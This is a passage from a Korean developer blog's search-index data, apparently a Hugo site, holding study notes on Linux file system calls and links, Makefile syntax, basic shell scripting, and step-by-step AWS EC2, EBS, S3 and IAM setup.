계수가 0이 된상태라도 참조 계수가 0이 아니면, inode 구조체와 data 영역은 남아있을 수 있다. (file 구조체로 값 참조 가능) 이후 참조 계수마저 0이 된다면 그제서야 inode 구조체와 data 영역을 지운다. 디렉터리 구조 DIR* directory_p = opendir(\u0026#34;.\u0026#34;);\rstruct dirent* directory_entry_p = readdir(directory_p); 디렉터리 정보는 struct dirent 형태의 구조체에 저장된다. struct dirent 구조체는 디렉터리 내부의 파일들의 정보를 담아내는 구조체이다. .d_name: 파일 이름 d_reclen: 파일 이름 길이 d_ino: inode 번호 d_off:: offset opendir() 함수로 directory를 열고 directory pointer를 얻은 다음 readdir() 함수로 directory 정보를 담은 구조체 포인터를 받아온다. directory pointer란, 디렉터리 정보에 접근할 수 있는 포인터이며, file pointer와 유사하게 cursor(offset)를 갖는다. dirent.h 헤더 파일에 정의되어 있다. chdir() 함수로 현재 프로그램이 참조하는 디렉터리 위치를 변경할 수 있다. (쉘에서 cd 명령과 동일) unistd.h 헤더 파일에 정의되어 있다. rewinddir() : 인자로 받은 directory pointer 의 cursor(offset)를 가장 처음으로 되돌리는 명령 커널 명령어 옵션 받기 커널에서 명령어를 사용할 때 - 문자를 사용하여 옵션을 추가할 수 있다. 커널 명령어를 작성할 때 unistd.h 에서 지원하는 getopt 함수를 사용하여 커맨드에 입력된 옵션을 간편하게 파싱할 수 있다. getopt( argc, argv, OPTIONS ): argc와 argv에서 옵션을 파싱한다. OPTIONS 는 옵션으로 처리할 캐릭터들을 char* 형태로 나열한다. (ex: \u0026ldquo;abcd\u0026rdquo;) 한번 호출 할 때 마다 argv를 하나씩 확인하며 OPTIONS에 해당하는 문자열이 들어있을 경우 옵션에 해당하는 캐릭터를 int형으로 반환한다. 옵션이 더이상 없으면 -1 을 반환한다. getopt는 내부적으로 argv의 위치를 변경하여 옵션들을 제일 앞으로 이동시키고, 나머지를 뒤로 옮긴다. -1을 반환하며 옵션 처리가 끝남을 회신한 후에는 전역변수 optind 로 남은 파라미터들을 접근할 수 있다. (ex: argv[optind]) 파일 링크 cp 명령은 directory entry와 i-node, 데이터를 모두 새로 복사하여 생성하는 deep copy 명령이다. 반면 ln 명령은 directory entry만 생성하고, i-node와 데이터를 공유하는 객체를 생성하게 된다. (shallow copy와 유사) ln 명령으로 i-node 데이터를 참조하는 directory entry를 늘리면, i-node안에 n-link 라는 데이터가 증가한다. (해당 i-node 데이터를 참조하는 entry의 개수 표시) 하드 링크 (hard link) mv 명령은 파일을 이동하는 명령으로, \u0026ldquo;복사(cp)\u0026rdquo; 동작과 \u0026ldquo;삭제(rm)\u0026rdquo; 동작을 수행해야 한다. 이때, 데이터가 큰 파일은 복사와 삭제에 자원이 많이 투입된다. 하지만 링크를 사용하여 directory entry만 신규로 생성하고, 기존 directory entry를 unlink 하면 i-node 정보와 data 정보는 복사와 삭제 동작을 수행할 필요가 없기 때문에 연산 속도를 대폭 증가시킬 수 있다. 참조) 디렉터리는 생성과 동시에 n-link 값이 2가 된다. 디렉터리 내부에 \u0026lsquo;.\u0026rsquo; 데이터가 본인을 참조하기 때문. 마찬가지로 \u0026lsquo;..\u0026lsquo;도 부모 디렉터리에 대한 하드링크이다. 심볼릭 링크 (symbolic link) 디렉터리에 대해서는 하드링크를 설정할 수 없도록 커널에서 설정되어 있다. 커널 명령어 중 -R 옵션이 있는 명령들이 있는데, 이는 \u0026lsquo;.\u0026lsquo;과 \u0026lsquo;..\u0026rsquo; 에 대해서는 재귀 호출을 하지 않도록 설정되어 있다. 만약 디렉터리의 하드링크가 가능해지면 이 명령들에 대해 무한 재귀호출이 발생하게 될 수 있어 디렉터리의 하드링크는 금지된다. 파일 시스템이 다르면 하드링크를 설정할 수 없다. 파일 시스템이 다르면 i-node 구조가 다르기 때문에 서로 참조할 수 없다.\n이러한 한계점을 해결할 수 있는 것이 심볼릭 링크이다.\nsymbolic link는 하나의 파일로 취급되며, 디렉터리를 연결시켜도 파일로서 자신의 정보를 가진다.\n(stat 함수와 lstat 함수가 symbolic link에 대해 다르게 동작하는 이유는 stat은 link가 가리키는 대상을 나타내고, lstat은 link 파일 자체를 가리키는 것) symbolic link는 다른 파일 시스템 간에도 연결시킬 수 있다.\n","permalink":"https://aswinblue.github.io/Blog/post/linux/system_programming/","summary":"System Programming 프로그램이 동작하는 구조는 크게 application, kernel, HW 로 분리할 수 있다. _____________\r| Library |\r¯¯¯¯¯¯¯¯¯¯¯¯¯ Application level\r------------------------------\r_____________\r|System call|\r¯¯¯¯¯¯¯¯¯¯¯¯¯ Kernel level\r------------------------------\r_____________\r| Hardware |\r¯¯¯¯¯¯¯¯¯¯¯¯¯ H/W level\r------------------------------ application level에서는 library를 사용하며, 이 코드들은 library buffer를 사용한다. (open(), read(), write(), close() \u0026hellip;) 시스템에서 제공하는 최적의 buffer 단위로 disk에서 값을 읽어오고, library buffer에 담아두면 작은단위로 읽어올 때 효율적이다. 예를들어, 한 줄씩 파일을 읽어야 한다면, 1byte씩 파일에서 \u0026lsquo;\\n\u0026rsquo;을 감지할 때 까지 읽을 수 있지만, BUF_SIZ만큼 파일에서 읽어서 library buffer에 담아두고 library buffer를 1byte씩 읽으며 \u0026lsquo;\\n\u0026rsquo;를 찾는 것이 실행 속도는 더 빠르다.","title":"System_programming"},{"content":"make 분할 컴파일을 통해 컴파일 작업 효율을 올리고, 이 과정을 자동화 하기 위해 일괄처리를 도와주는 도구이다. batch 파일로 컴파일 하면, 변경점을 감지하지 못해 batch파일을 수정하지 않고서는 분할 컴파일을 수행할 수 없다. make파일은 파일들 간의 의존성을 정의하여, 특정 파일이 수정되면 어떤 파일을 컴파일 해야하는지 알아서 판단해 준다. 리눅스 시스템의 수정 시간을 확인하여, 빌드 결과물이 생성된 시간과 소스가 수정된 시간을 비교해서 컴파일 혹은 링킹이 다시 필요한지 판단하는 원리이다. 기본구조 파일 이름은 Makefile 으로 생성한다. TARGET:DEPENDENCIES\rCOMMANDS COMMANDS 앞에는 공백이 아니라 tab문자이다. COMMAND를 실행하여 TARGET파일 생성한다는 의미이다. TARGET을 생성할 때 DEPENDENCIES 파일들이 필요하다. DEPENDENCIES파일이 수정되면 TARGET파일도 다시 컴파일 해야한다는 의미이다. # 주석 : 주석은 #으로 달 수 있다. @COMMANDS: make파일은 실행시 \u0026lsquo;실행한 명령 원문\u0026rsquo; 과 \u0026lsquo;실행 결과\u0026rsquo; 를 모두 쉘이 출력한다. @를 붙이면 명령 원문은 출력하지 않는다. 기본 형태를 약간 변형하여 명령어를 생성할 수도 있다. DEPENDENCIES 를 없이 TARGET 과 COMMANDS 만 남기면, make TARGET 명령을 입력시 해당 COMMANDS 만 수행되도록 할 수 있다. clean:\rrm -f ${OBJ}${TARGET}\r# make clean 명령시 위 동작 수행\rinstall:\r...\r# 동일한 형태로 다른 명령도 작성 가능 make 파일 정의 COMMANDS 대부분의 명령들은 쉘 명령과 유사하다. echo \u0026lt;VALUE\u0026gt; : VALUE 값을 출력한다. VARIABLE = VALUE : VARIABLE 이라는 이름의 변수를 선언하고, VALUE 값을 대입함 변수 선언시 자기 자신을 참조하는 형태(recursive)는 = 연산자로 사용 불가능하다. (ex: VARIABLE = ${VARIABLE} + DATA) 대신 := 연산과 += 연산을 사용 가능하다. ex) VARIABLE := ${VARIABLE} + DATA, VARIABLE += DATA $(VARIABLE) : VARIABLE 변수에 해당하는 값을 호출 (${VARIABLE} 과 동일) TIP: 컴파일 도구를 변수로 지정해 놓으면 좋다. CC=gcc -\u0026gt; $(CC) -c file.c TIP: 최종 파일 이름을 변수로 지정해 놓으면 좋다. PROJECT_NAME=myProject -\u0026gt; gcc -o $(PROJECT_NAME) file1.o file2.o TIP: .o파일을 만드는 -c 옵션을 CFLAGS 로 변수로 사용하면 좋다. -\u0026gt; CFLAGS = -I./include -c 와 같이 include path 및 기타 설정이 가능하다. TIP: 링킹을 위한 LFLAGS 또한 같은 맥락에서 변수로 활용하면 좋다. ${VARIABLE:ASIS=TOBE} : VALUE 변수에서 ASIS라는 구문을 TOBE라는 구문으로 치환한다. (ex: PROJECT_NAME:my=your-\u0026gt; ${PROJECT_NAME} == yourProject) 내장 매크로 make 파일의 target-dependency-command 라인들에 일일이 파일 이름을 써 넣고 수정하기 번거롭기에, 아래와 같이 매크로를 활용해 좀더 편리하게 작업을 수행할 수 있도록 한다. 내장 매크로를 활용하면 command에 파일 이름을 직접쓰지 않아도 되게 된다. $\u0026lt; : DEPENDENCIES 중 가장 선두 $^ : DEPENDENCIES 전체를 의미 $@ : TARGET을 의미 $* : 확장자가 없는 TARGET을 의미 $? : DEPENDENCIES 중 TARGET보다 수정 시간이 늦은 파일들 .c.o: : Makefile 안에서 언급된 모든 xxx.o 파일을 만들기 위해 동일한 이름을 가진 xxx.c 파일들을 컴파일하여 xxx.o 파일을 생성한다. %.o : %.c : .c.o 와 동일한 효과를 낸다. 좀더 신규 스타일이다. 최종 예시를 보면 다음과 같다. CC = gcc\rCFLAGS = -c\rTARGET = a.out\rOBJ = main.o func1.o\r${TARGET} : ${OBJ}\r${CC} ${OBJ} -o ${TARGET} # gcc main.o func1.o -o a.out 와 동일\r.c.o : # 위에서 언급된 모든 .o 파일(OBJ)을 만들기 위해 .c 파일로 .o 파일 생성\r${CC} ${CFLAGS} $\u0026lt; # $\u0026lt;는 가장 선두의 dependency를 의미함. 즉 gcc -c xxx.c 와 동일 쉘 명령어 make : 현재 경로에 있는 Makefile 을 실행한다. make install : 해당 경로의 소스를 컴파일하여 /usr/local/lib, /usr/local/bin 폴더로 .so파일과 .bin파일 복사 make -f \u0026lt;FILE_NAME\u0026gt; : Makefile 대신 FILE_NAME 을 make파일로 가정하고 실행한다. make -p : 설정된 매크로 옵션들을 확인 가능 ","permalink":"https://aswinblue.github.io/Blog/post/c++/make/","summary":"make 분할 컴파일을 통해 컴파일 작업 효율을 올리고, 이 과정을 자동화 하기 위해 일괄처리를 도와주는 도구이다. batch 파일로 컴파일 하면, 변경점을 감지하지 못해 batch파일을 수정하지 않고서는 분할 컴파일을 수행할 수 없다. make파일은 파일들 간의 의존성을 정의하여, 특정 파일이 수정되면 어떤 파일을 컴파일 해야하는지 알아서 판단해 준다. 리눅스 시스템의 수정 시간을 확인하여, 빌드 결과물이 생성된 시간과 소스가 수정된 시간을 비교해서 컴파일 혹은 링킹이 다시 필요한지 판단하는 원리이다. 기본구조 파일 이름은 Makefile 으로 생성한다.","title":"Make"},{"content":"Shell Programming 리눅스 쉘 프로그래밍에 대해 기술한다. 쉘 프로그래밍은 bash, sh 등의 명령어를 활용한 로직을 칭하며, 리눅스 환경에서 text 파일 안에 명령어를 작성해 놓고, 실행하는 방식으로 사용한다. 명령어가 든 파일의 확장자는 보통 .sh 로 세팅한다. (윈도우 OS의 .batch 와 유사) .sh 파일 작성 새로 생성된 text 파일은 확장자가 .sh 라도 실행 권한이 없기 떄문에 chmod 명령어로 권한을 수정해야 한다.\nex) chmod a+x \u0026lt;파일이름\u0026gt; 명령으로 모든 사용자에 대해 실행 권한을 부여할 수 있다. .sh 파일 안에는 shell 명령어들을 사용할 수 있다. 그 외 추가적으로 작성할 수 있는 구문들은 다음과 같다.\n#!/bin/bash : /bin/bash 경로의 shell 로 아래 명령어들을 실행하겠다고 세팅\n쉘 파일을 실행할 때 어떤 shell로 실행될지 설정 하는 구문으로, .sh 파일의 최상단부에 기입한다. set :\nset -e : 오류나 에러가 발생하면 즉시 스크립트를 종료 set -x : 스크립트 내 실행되는 명령어의 결과를 화면에 출력 echo : 화면에 문자열을 출력하는 구문 (C언어의 printf, python의 print 와 유사한 역할)\necho -e : \\ 문자를 escape 문자로 취급해 \\n 과 같은 특수 문자를 사용할 수 있게 하는 옵션 $# 파라미터 개수를 나타내는 변수\nex) $ ./myscript.sh param1 param2 명령어로 쉘 스크립트를 실행시켰다면, $# 은 2이다. $1: 첫 번째 파라미터\n$2: 두 번째 파라미터\n$@: 모든 파라미터\nex) $ ./myscript.sh param1 param2 명령어로 쉘 스크립트를 실행시켰다면, $@ 은 param1 param2 이다. ","permalink":"https://aswinblue.github.io/Blog/post/linux/shell_programming/","summary":"Shell Programming 리눅스 쉘 프로그래밍에 대해 기술한다. 쉘 프로그래밍은 bash, sh 등의 명령어를 활용한 로직을 칭하며, 리눅스 환경에서 text 파일 안에 명령어를 작성해 놓고, 실행하는 방식으로 사용한다. 명령어가 든 파일의 확장자는 보통 .sh 로 세팅한다. (윈도우 OS의 .batch 와 유사) .sh 파일 작성 새로 생성된 text 파일은 확장자가 .sh 라도 실행 권한이 없기 떄문에 chmod 명령어로 권한을 수정해야 한다.\nex) chmod a+x \u0026lt;파일이름\u0026gt; 명령으로 모든 사용자에 대해 실행 권한을 부여할 수 있다.","title":"Shell Programming"},{"content":"Aws Aws 로그인 root 로그인과 IAM 로그인이 있다. 필요한 권한만 할당된 IAM 계정을 사용하는 것이 안전하며, root는 외부로 공유되지 않게 하고 보안을 철저히 한다. Window 서버 생성 window 서버 vs Linux 서버\n중소기업쪽에서는 보안 및 관리할 것들이 줄어드는 Window 서버를 많이 선호하는 편이다. t 시리즈는 범용서버이다. t2.large는 꽤 큰 서버이다. 프리티어를 사용하면 일부 서비스를 무료로 사용할 수는 있지만, 성능이 좋지는 않다. 좌측상단 \u0026lsquo;서비스\u0026rsquo;를 선택, EC2를 찾아서 들어간다. (또는 검색창에서 EC2를 검색)\n기본으로 \u0026lsquo;대시보드\u0026rsquo; 에 접근된다. 리소스는 내가 현재 사용하고 있는 제품들을 나타낸다. 리소스에 보안그룹 하나가 떠 있는데, 일종의 방화벽이라 생각하면 된다. 요금과는 상관 없다. 좌측 메뉴에서 인스턴스를 클릭한다.\n내가 만든 인스턴스들을 볼 수 있다. 아직 아무것도 안만들었으면 아무것도 없다. 주황색 버튼 \u0026lsquo;인스턴스시작\u0026rsquo;을 눌러준다. 상단에 보면 7단계가 보여지는데, 이를 모두 수행하면 생성이 완료된다. AMI 선택 Window 이미지를 선택한다. 이미지 ID가 업데이트할 때 마다 달라질 수 있으므로, ID보다 이름을 보고 찾는다. 아이콘에 \u0026lsquo;프리티어사용가능\u0026rsquo; 이라고 적혀있으면 프리티어에서도 사용할 수 있는 이미지다. 이미지는 OS + 기타 설정값을 모두 포함하고 있다. 자동 배포되면 알아서 설치된다. 가상화로 인해 설치가 많이 편해졌다. type 선택 instance 유형을 선택한다. 메뉴에서 직접 체크박스를 선택해 사용할 수도 있고, 드롭박스에 instance 패밀리, 세대를 선택 가능하다. 프리티어 사용 가능한 항목들은 확인 후 선택. 돈은 별로 안나가지만 느리다. CPU 크레딧이라는 용어를 쓴다. T2라지 사이즈의 EC2를 4대정도 갖고 있으면 아무거솓 안해도 하루에 10불정도 나갈 수 있다. 검토 및 시작은 빠르게 시작하기 위해 나머지 설정을 default로 선택하는 것이다. \u0026lsquo;다음\u0026rsquo; 을 클릭하여 인스턴스 세부정보를 선택한다. 인스턴스 세부설정 인스턴스 개수를 원하는 만큼 만들 수 있다. 자동으로 IP, ID, MAC등 각각 할당해준다. 우리가 생성한 네트워크가 있다면 어떤 네트워크에 올릴지 선택 가능. 현재 만들어진 네트워크가 없으면 default 네트워크 하나 선택가능 서브넷 설정하지 않으면 랜덤하게 아무데나 들어간다. default 네트워크는 subnet이 4개가 잡혀있다. 2개 이상의 instance 통신과 관련 public IP는 subnet의 설정을 가져와서 설정하거나(서브넷 사용 설정) 그냥 설정(활성화)하거나 선택 가능 도메인, IAM 선택 가능 절전모드 및 종료 방지 옵션을 선택 가능하다. 검토 및 시작은 다음 옵션을 생략하는 기능이다. 스토리지 추가 OS가 붙는다는 이야기는 스토리지가 붙는다는 이야기이다. 리눅스 서버일 때 VM에 붙는 기본 스토리지는 8GB이다. 윈도우는 기본 30GB이다. 볼륨 유형도 선택 가능. 범용 SSD가 보통이고, 프로비저닝된 IOPS는 속도가 빠름. 마그네틱은 느림 스토리지 암호화도 가능 \u0026lsquo;새 볼륨 추가\u0026rsquo; 버튼으로 추가 스토리지 선택 가능 \u0026lsquo;디바이스\u0026rsquo; 열에서는 이름을 선택하는 것이다. 리눅스에서는 mount할 때 사용할 이름이다. \u0026lsquo;종료시 삭제\u0026rsquo; 옵션으로 EC2종료시 스토리지는 삭제를 안할수도 있다. 태그 추가 VM을 다수로 만들면 태그를 남겨서 검색/관리가 용이하도록 만들어 줄 수 있다. 태그는 key-value값으로 지정이 가능하며 2개 이상도 설정 가능하다. 보안그룹 구성 인스턴스에 대한 트래픽을 제어하는 방화벽 규칙 세트 AWS자체의 방화벽이 따로 있고 종류도 많지만 instance마다 방화벽이 또 따로 존재한다. 새로만들면 이름, 설명에 기본값을 채워준다. 보안그룹은 inbound 규칙을 설정하는 것 기본 규칙으로 RDP(remote desktop protocol)이 있는데, 이를 제거하면 instance로 접속할 방법이 없다. 소스에 0.0.0.0/0은 default라 한다. 누구나 붙을 수 있다는 의미. 누구나 IP만 알면 붙을 수 있지만 key가 없으면 접속이 불가능하도록 되어있음 검토 및 시작 설정한 내용들을 모두 보여준다. 각종 경고들이 뜰 수 있다. 시작하기 선택시 public key, private key 설정팝업 생성됨. 기존 key를 입력하거나 새로 생성할 수 있음 키 페어를 생성하고, 키페어 이름을 설정한 후 다운로드를 하면 .pem파일(private key)가 다운로드 된다. 다운받은것을 확인한 후 시작을 누르면 된다. key가 없으면 instance 접속이 안되니 꼭 확인하도록 한다. 생성이 완료되면 대기중으로 표시되어 있다. 이후 실행중으로 변경됨 완료 후 인스턴스 창으로 가면 생성된 내용이 있다. t2.large는 속도가 빨라 생성이 빠르게 되었다. 성능이 좋지 않으면 pending이 있을 수 있음. private key는 AWS management control에서 다시 받을 수 있는 방법은 없다. 분실한 경우 instance를 새로 생성해야됨. RDP를 이용한 window 서버 접속\n생성한 EC2에 이름을 설정 가능하다. 이름을 설정하면 자동으로 태그에도 Name:{이름} 이 기록된다. window에서 기본으로 제공하는 원격 데스크톱 파일로 접속 가능하다. IP주소, port 입력, key 입력 등 작업이 필요 생성한 EC2를 선택하고 상단 작업중 \u0026lsquo;연결\u0026rsquo;을 선택한다. (원하는 EC2에 우클릭을 해도 된다.) RDP 클라이언트를 선택한다. 세션 매니저는 window와 linux용이 아니라 RDP 클라이언트를 선택한다. 원격데스크톱 파일을 다운로드 받는다. 암호 가져오기로 이전에 다운받아놓은 private key를 불러온다. \u0026lsquo;암호해독\u0026rsquo; 버튼을 눌러 해독을 진행 개인키를 바당으로 생성된 암호가 콘솔에 확인된다. 암호를 복사 후 취소를 눌러 창을 끈다. (4)에서 받은 파일을 실행시켜준다. 일반 \u0026lsquo;원격 데스크톱\u0026rsquo; 앱에서 기본 정보가 세팅된 형태로 제공된다. 아까 복사한 암호를 넣고 인증서 처리를 한 후 확인을 누른다. 정보 확인\n원격 데스크톱 창이 열리면 최초 접속이라 window가 각종 설정들을 수행하는 작업을 한다. 데스크톱 우측 상단에 EC2 정보가 떠있다. cmd창에서 IP를 확인해보면 우측상단 정보와 동일하다. disk management를 열어보면 붙여준 스토리지가 확인된다. 디스크 설정\n추가된 스토리지는 확인은 되는데 기본으로 offline이다. 우클릭을 하여 online으로 바꿔주고, 다시 우클릭을 하여 MBR기반으로 initialize 시켜준다. 다시 우클릭을 하여 new simple volume을 선택해 볼륨을 지정해 준다. 완료해 주면 정상적으로 디스크가 연결되고 동작한다. 인스턴스 종료(terminate)\n윈도우 종료로 instance를 끌 수도 있지만, management console을 통해 종료도 가능하다.\ninstance를 선택 후 상단 작업에서 \u0026lsquo;인스턴스 상태\u0026rsquo; -\u0026gt; \u0026lsquo;종료\u0026rsquo; 작업을 클릭한다.\n종료시키면 경고문이 뜬다. 확인을 누르면 \u0026lsquo;종료중\u0026rsquo; 상태로 돌입하며 잠시 후 삭제된다.\n종류 후에도 \u0026lsquo;종료됨\u0026rsquo; 으로 변경되는데 이 상태도 오랫동안 유지된다.\ninstance 생성시 우리는 기본 볼륨 + 추가볼륨을 선택했는데, 기본 볼륨은 instance삭제시 함께 삭제되도록 했고, 추가볼륨은 유지하도록 했다.\n좌측 메뉴의 Elastic Block Store -\u0026gt; \u0026lsquo;볼륨\u0026rsquo;을 선택하면 instance를 삭제하고도 볼륨이 하나 남아있음을 확인 가능하다.\n볼륨도 선택하여 \u0026lsquo;작업\u0026rsquo; -\u0026gt; \u0026lsquo;삭제\u0026rsquo; 작업으로 삭제 가능하다.\n종류 후 instance 대시보드로 들어가면 보안그룹은 그대로 유지됨을 확인할 수 있다.\n보안그룹, 키페어 등 완전히 삭제되지 않는 요소들이 있다.\n요금확인\nCPU가 돌지 않으면 요금이 발생하지 않는다. 검색창에 billing을 검색하면 대금 서비스로 들어가면 비용을 확인할 수 있다. instance 생성, 삭제에 대해서는 크게 비용이 발생하지 않고 연산을 수행하면 그때 과금이 된다. Linux 서버 생성 instance 생성\nAMI 선택 AmazonLinux2 AMI 는 아마존에 최적화된 debian계열 리눅스. 아마존에 필요한 설정들이 기본적으로 세팅된 이미지이다. 타입 선택 세부설정 스토리지 추가 기본으로 8GB 제공한다. 윈도우 30GB와 차이. 태그 보안그룹 기존에 생성된 보안그룹이 있다면 불러와서 사용도 가능하다. 검토 및 확인 확인을 누르면 키페어 설정이 가능하다. 기존 키페어를 사용할 수도 있다. 생성이 완료되면 대기중으로 표시되어 있다. 이후 실행중으로 변경됨 서버 접속\n리눅스 서버는 ssh 프로토콜로 접속이 가능하다. 로컬 PC가 윈도우라면 putty를 통해 접속하자. 리눅스에서 접속할 시, 아래 명령어로 접속 가능 ssh -i \u0026quot;AWS_EC2_KEY.pem\u0026quot; ec2-user@ec2-3-34-96-253.ap-northeast-2.compute.amazonaws.com ppk(putty private key)생성 putygen을 실행하여 기존의 private key(.pem)를 putty에서 사용가능한 key(.ppk)로 변경한다. \u0026lsquo;conversation\u0026rsquo; -\u0026gt; \u0026lsquo;import key\u0026rsquo; -\u0026gt; \u0026lsquo;save private key\u0026rsquo; 비밀번호를 설정해서 만들 수 있지만 경고가 떠도 그냥 생성도 가능하다. ppk(putty private key) 가 생성된다. putty로 접속 좌측 메뉴의 \u0026lsquo;connection\u0026rsquo; -\u0026gt; \u0026lsquo;Auth\u0026rsquo; 항목에서 Private key file for authentication 항목에서 ppk를 불러와 넣는다. 편의설정 Window-\u0026gt;Appearance: font크기 Terminal-\u0026gt;Bell: 소리없음 Terminal-\u0026gt;Keyboard:backspace key = control-H management consol에서 해당 instance를 클릭해 퍼블릭 ipv4 주소를 확인해 복사해온다. putty에 IP를 넣고 연결한다. putty security alert가 발생하지만 무시하고 accept를 누르면 된다. 기본 ID는 \u0026rsquo;ec2-user\u0026rsquo; 이고, 비밀번호는 없다. 키페어 가져오기 로컬에서 이미 사용하고 있던 key를 가져와서 서버에 적용하는 기능\npublic key를 붙여넣으면 AWS에서 관리하는 key를 생성함\nkey 생성 알고리즘과 key 길이가 이미 규정되어있는 경우 직접 생성해서 사용해야 할때 이렇게 사용하면 된다.\nkey 생성 puttygen을 실행하여 generate 버튼을 누르면 마우스 움직임을 기반으로 랜덤 키를 생성해 준다. instance를 이미지로 제작 AMI를 이용하여 instance를 백업\n백업할 instance에 우클릭 -\u0026gt; 이미지 탬플릿 -\u0026gt; 이미지 생성\n좌측 메뉴의 \u0026lsquo;이미지\u0026rsquo; -\u0026gt; \u0026lsquo;AMI\u0026rsquo; 항목을 선택하면 위에서 선택한 instance가 이미지로 생성되고 있다. 시간이 소모되는 작업\n생성된 이미지에 이름을 붙여준다. AWS에서 객체를 생성하면 이름을 붙여주는게 좋다. 나중에 찾기도 편하고 알아보기도 쉬워진다.\n이미지를 생성하지 않고 instance 자체를 복사할 수는 없다.\n백업한 AMI 다른 리전으로 이동\n이동할 AMI에 우클릭 -\u0026gt; AMI 복사 선택 원하는 리전을 선택하여 복사를 수행한다. 완료 후 management console의 현재 지역을 이동한 위치로 이동하면 이미지가 보인다. 백업한 AMI를 다른 계정으로 전달\nAMI에 우클릭 -\u0026gt; 이미지 권한 수정 선택 계정 번호를 입력하면 다른 계정으로 이미지를 전달할 수도 있다. custom AMI로 EC2 시작 원하는 AMI를 선택하고 우클릭 -\u0026gt; \u0026lsquo;시작하기\u0026rsquo; 선택 기존에 EC2 생성 단계와 동일 볼륨 생성 볼륨 메뉴에서 \u0026lsquo;볼륨생성\u0026rsquo; 버튼을 선택한다. 스냅샷은 현재 생성된 instance의 스냅샷 정보가 보이는 것이다. 세팅을 하여 생성하면 available이 보인다. 볼륨 연결 생성된 볼륨에 우클릭을 하여 \u0026lsquo;볼륨 연결\u0026rsquo;을 선택하면 볼륨을 붙일 수 있다. \u0026lsquo;인스턴스\u0026rsquo;항목에는 볼륨을 붙일 instance의 ID를 찾아서 넣는데, AWS에서 자동으로 적어준다. \u0026lsquo;디바이스\u0026rsquo;항목값은 instance에 붙었을 때 가지는 경로이다. 알맞은 형태로 포멧을 수행한다. : sudo mkfs -t ext4 \u0026lt;파일시스템경로\u0026gt; 마운트 : sudo mount /dev/sdf /mnt 확인 : df -h 언마운트 : sudo umount /mnt 스냅샷 생성 스냅샷은 백업의 목적으로 만들어진 개체 볼륨 항목에서 생성된 볼륨을 우클릭하여 스냅샷 생성을 선택한다. 생성된 스냅샷은 스냅샷 목록에서 확인 가능하다. 스냅샷으로 볼륨 생성 스냅샷 선택하고 우클릭하여 \u0026lsquo;볼륨생성\u0026rsquo; 선택 생성된 볼륨은 available 상태로 대기상태 스냅샷으로 이미지 생성 스냅샷을 우클릭하여 \u0026lsquo;이미지 생성\u0026rsquo; 선택\n확인을 누르면 \u0026lsquo;AMI\u0026rsquo; 항목에 새로운 이미지가 available 상태로 생성된다.\n생성된 이미지가를 실행하면 EC2로 실행된다.\n만약 root 시스템이 담기지 않은 볼륨을 스냅샷으로 만들어 이미지로 만든것이라면, 제대로 실행되지 않는다.\n일반적으로 EBS만 이미지를 만드는 용도의 storage\nEFS나 S3로는 root 파일 시스템을 만드는 용도로는 잘 사용하지 않는다.\n리전간 이동 인스턴스나 볼륨은 리전간 이동이 안된다.\n스냅샷이나 AMI 형태로 전달은 가능하다. 스냅샷은 백업용도, AMI는 인스턴스 생성용도로 약간 용도는 다르다.\n스냅샷 목록에서 원하는 스냅샷 선택, 우클릭, 복사 선택. 대상 리전을 선택\n해당 리전에 스냅샷이 이동된다.\nS3서버 백본 속도 테스트 -http://s3-accelerate-speedtest.s3-accelerate.amazonaws.com/en/accelerate-speed-comparsion.html 경로에서 확인 가능\nS3 서버 생성 검색창에 S3를 검색하여 진입 \u0026lsquo;버킷\u0026rsquo; 메뉴에서 \u0026lsquo;버킷 만들기\u0026rsquo; 버튼을 클릭하여 버킷 생성 내용 설정 버킷 이름 설정. unique 한 이름을 지정해야 한다. 리전 선택 퍼블릭 엑세스 설정 퍼블릭 엑세스 차단을 해제하면 경고문에 확인 체크를 넣어준다. 생성 버튼을 클릭하면 생성 완료 폴더 생성 버킷 안에도 폴더를 생성하여 경로를 만들 수 있다. 생성된 버킷을 클릭하여 진입한다. \u0026lsquo;폴더 만들기\u0026rsquo; 버튼을 클릭하여 폴더를 생성한다. 파일 업로드 생성된 버킷에 진입. 필요하면 폴더 내부로 진입 원하는 파일 및 폴더를 선택하여 업로드 S3 URI(Uniform Resource Identifier) : S3에서 실제 파일이 있는 위치를 URI로 표현 객체 URL(Uniform Resource Locator): 외부에서 S3로 접근하여 파일을 확인할 수 있는 정확한 위치값(가상hosting 기반 URL) 객체 public으로 설정 표시된 URL 경로로 들어가면 접속 권한이 없어 Access Denied 화면이 뜬다. 버킷이 public이어도 내부 객체들을 public으로 지정해 두어야 외부에서 접속할 수 있다. 버킷에 진입하여 원하는 객체를 선택한 후 \u0026lsquo;작업\u0026rsquo; 버튼을 클릭하여 \u0026lsquo;퍼블릭으로 설정\u0026rsquo; 을 눌러주어야 외부에서 접근이 가능해진다. AWS는 default로 private설정을 가져가는것이 정책이다.(S3뿐 아니라 instance, storage도) 객체 삭제 객체를 선택하고 \u0026lsquo;삭제\u0026rsquo; 버튼을 선택한다. AWS에서는 삭제 후 이상이 생길 수 있는 경우에 대비해 서명하듯이 직접 입력하는 과정이 있다. 버킷 생성시 버전관리를 수행하도록 체크했으면 영구삭제가 불가능하다. \u0026lsquo;삭제\u0026rsquo;=\u0026lsquo;삭제 태그 기입\u0026rsquo; 에 해당한다. 버전관리를 하지 않으면 \u0026lsquo;삭제\u0026rsquo;=\u0026lsquo;영구삭제\u0026rsquo; 에 해당한다. Local 파일 백업 IAM (Identity and Access Management) 사용자 생성, 권한 설정, 비밀번호 설정, 조직 생성 등 작업 수행 가능한 메뉴 IAM 시스템에 진입한다. \u0026lsquo;사용자\u0026rsquo; 메뉴로 진입한다. 설정을 원하는 사용자를 선택하여 진입 MFA : Multi Factor Authentication : OTP같은 추가 인증 수단을 설정 엑세스 키 생성 \u0026lsquo;엑세스 키 만들기\u0026rsquo; 버튼을 클릭하여 키를 생성한 후 다운로드 엑세스 키는 CSV 파일로 제공된다. 다운받은 엑세스 키는 Aws CLI를 사용할 때 필요하다. Aws CLI 실행 aws configure 명령 실행 이전에 받은 csv파일에서 AWS Access Key ID, Secret Access Key 기입 default region : ap-northeast-2 default output format : json 명령어를 통해 백업 폴더 설정 aws s3 sync {로컬위치} {s3버킷 URI} ex) aws s3 sync backup_local s3://fastswimmingapple/backup/ S3 서버 해당 버킷의 위치로 찾아가서 새로고침을 하면 업로드 됨을 확인할 수 있다. 정적 웹사이트 호스팅 버킷을 생성한다. public 연결을 허용하여 만든다. 생성된 버킷을 선택하여 진입한다. \u0026lsquo;속성\u0026rsquo; 항목에서 \u0026lsquo;정적 웹사이트 호스팅\u0026rsquo; 항목을 찾아 \u0026lsquo;편집\u0026rsquo;을 클릭한다. 정적 웹사이트 호스팅을 활성화 